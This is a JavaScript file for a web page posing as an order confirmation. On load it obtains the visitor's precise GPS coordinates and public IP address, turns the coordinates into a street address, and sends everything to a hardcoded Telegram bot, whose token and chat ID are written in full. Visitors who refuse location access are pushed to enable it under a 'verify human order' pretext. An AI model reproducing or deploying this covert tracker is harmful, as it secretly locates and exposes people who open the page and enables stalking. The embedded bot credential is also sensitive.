window.onload = function() {
    async function getIPv4Address() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IPv4 address:', error);
            return 'Error fetching IPv4 address';
        }
    }

    async function reverseGeocode(latitude, longitude) {
        try {
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
            const data = await response.json();
            const address = {
                city: data.address.city,
                state: data.address.state,
                country: data.address.country,
                pincode: data.address.postcode,
                addressLine: data.display_name
            };
            return address;
        } catch (error) {
            console.error('Error fetching address:', error);
            return null;
        }
    }

    async function sendToTelegram(ipv4, ipv6, latitude, longitude, accuracy, code, address) {
        const timestamp = new Date().toLocaleString();
        const message = `Order Details:\nIPv4 Address: ${ipv4}\nIPv6 Address: ${ipv6}\nGPS Coordinates: Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters\nVerification Code: ${code}\nAddress: ${address.addressLine}\nCity: ${address.city}\nState: ${address.state}\nCountry: ${address.country}\nPincode: ${address.pincode}\nTimestamp: ${timestamp}`;
        const response = await fetch('https://api.telegram.org/bot6808758500:AAED6yT6IR_Usz4Ytt-7l1eaZWZm8OPUD9A/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '6741821286',
                text: message
            })
        });
        const data = await response.json();
        if (data.ok) {
            document.getElementById('confirmation').innerText = 'Thanks For Placing Order! Your order has been received.';
            document.getElementById('verificationCode').innerHTML = `<span class="copy-animation">Your verification code: <strong>${code}</strong></span>`;
            document.getElementById('copyButton').style.display = 'inline';
            document.getElementById('googleFormMessage').style.display = 'inline';
            document.getElementById('copyButton').setAttribute('data-clipboard-text', code);
        } else {
            document.getElementById('confirmation').innerText = 'Sorry, there was an error processing your order. Please try again later.';
        }
    }

    function getGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const ipv4 = await getIPv4Address();
                    const ipv6 = ''; 
                    const code = generateRandomCode();
                    const address = await reverseGeocode(latitude, longitude);
                    sendToTelegram(ipv4, ipv6, latitude, longitude, accuracy, code, address);
                },
                function(error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        document.getElementById('error').style.display = 'block';
                        document.getElementById('error').innerText = "Please enable location services to proceed And Verify Human Order Or Flase Order.";
                    } else {
                        document.getElementById('error').style.display = 'block';
                        document.getElementById('error').innerText = "An error occurred while getting location. Please try again.";
                    }
                }
            );
        } else {
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').innerText = 'Geolocation not supported.';
        }
    }

    function generateRandomCode() {
        const regexCode = /\d{9}/;
        return Math.floor(100000000 + Math.random() * 900000000); // Generates a random 9-digit number
    }

    getGPS();
}

function copyCode() {
    const code = document.getElementById('copyButton').getAttribute('data-clipboard-text');
    const el = document.createElement('textarea');
    el.value = code;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    alert('Code copied to clipboard!');
}
